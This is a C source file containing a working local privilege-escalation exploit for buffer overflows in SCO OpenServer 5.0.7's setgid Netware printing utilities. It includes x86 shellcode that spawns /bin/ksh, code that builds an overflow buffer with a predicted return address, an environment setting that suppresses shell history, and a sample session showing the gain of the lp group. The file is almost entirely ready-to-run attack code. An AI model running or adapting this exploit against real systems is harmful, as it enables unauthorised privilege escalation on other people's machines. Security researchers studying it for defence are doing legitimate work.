/* SCO Openserver 5.0.7 Netware Printing utilities exploit
 * =======================================================
 * Multiple buffer overflows exist in the handling of command
 * line arguements in SCO Openserver Netware printing utils.
 * EIP is overwritten after 997 bytes are supplied on the
 * command line. The following binaries are installed setgid
 * 'lp' as default and are vulnerable to this attack.
 *
 * /opt/K/SCO/nuc/1.1.0Ba/public/usr/lib/nucrt/bin/nwlpstat
 * /opt/K/SCO/nuc/1.1.0Ba/public/usr/lib/nucrt/bin/nwcancel
 * /opt/K/SCO/nuc/1.1.0Ba/public/usr/lib/nucrt/bin/nwprint
 *
 * The exploit calculates the return address using a predictive
 * environment.
 * 
 * Example.
 * $ uname -a
 * SCO_SV scosysv 3.2 5.0.7 i386
 * $ id
 * uid=200(user) gid=50(group) groups=50(group)
 * $ gcc prdelka-vs-SCO-netwarex.c -o prdelka-vs-SCO-netwarex 
 * $ ./prdelka-vs-SCO-netwarex /opt/K/SCO/nuc/1.1.0Ba/public/usr/lib/nucrt/bin/nwlpstat
 * [ SCO Openserver 5.0.7 netware utilities privilege escalation exploit
 * [ Using return address 0x8047f96
 * $ id
 * uid=200(user) gid=50(group) egid=18(lp) groups=50(group)
 * 
 * - prdelka
 */
#include <stdio.h>
#include <stdlib.h>

char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90"
	         "\x68\xff\xf8\xff\x3c\x6a\x65\x89"
		 "\xe6\xf7\x56\x04\xf6\x16\x31\xc0"
		 "\x50\x68""/ksh""\x68""/bin""\x89"
		 "\xe3\x50\x50\x53\xb0\x3b\xff\xd6";

int main(int argc,char* argv[])
{
	char* buffer;
	char *env[] = {"HISTORY=/dev/null",NULL};
	long eip,ptr;
	int i;
        printf("[ SCO Openserver 5.0.7 netware utilities privilege escalation exploit\n");
        if(argc < 2)
        {
                printf("[ Error  : [path]\n[ Example: %s /opt/K/SCO/nuc/1.1.0Ba/public/usr/lib/nucrt/bin/nwlpstat\n",argv[0]);
                exit(0);
        }
        eip = 0x41414141;
        buffer = malloc(1000 + sizeof(eip) + strlen(shellcode));
	memset(buffer,'\x00',1000 + sizeof(eip) + strlen(shellcode));
        ptr = (long)buffer;
        strncpy(buffer," ",1);
        for(i = 1;i <= 998;i++)
        {
                strncat(buffer,"A",1);
        }
        ptr = ptr + 998;
        eip = 0x08048000 -4 -strlen(argv[1]) -1;
        memcpy((char*)ptr,(char*)&eip,4);
	strncat(buffer,shellcode,strlen(shellcode));	
        printf("[ Using return address 0x%x\n",eip);
        execle(argv[1],argv[1],buffer,NULL,env);
        exit(0);
}

